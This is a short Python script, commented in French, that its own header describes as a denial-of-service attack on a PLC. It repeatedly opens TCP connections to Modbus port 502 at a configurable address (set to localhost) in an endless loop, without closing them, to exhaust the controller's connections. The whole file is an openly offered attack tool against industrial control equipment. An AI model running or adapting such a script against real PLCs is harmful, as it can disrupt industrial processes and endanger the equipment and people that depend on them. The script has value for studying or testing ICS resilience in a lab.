#! /usr/bin/env python3

'''
Fichier : deni_de_service.py
Description : Effectue un déni de service sur le PLC
Version : 2
'''

__auteur__ = 'jd'

# importation des librairies
import subprocess, socket

# fonction qui va établir la connexion
def connexion():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	return s

# fonction qui va effectué un déni de service
def deni_de_service():
	try:
		print('Connexion au PLC %s...' %ip, end = '')
		s = connexion()
		print(' Connecté.')

	except socket.error as e:
		print('ERREUR : Connexion impossible sur le PLC ayant pour adresse ip %s sur le port %s.' % (ip, port))
		exit()

if __name__ == '__main__':
	# déclaration des variables
	ip = '127.0.0.1'
	port = 502

	try:
		# nettoyage de la console
		subprocess.call('clear', shell = True)

		connexion()
		while 1:
			deni_de_service()

	except KeyboardInterrupt:
		print('\nVous avez appuyé sur Ctrl-C\n')
		exit()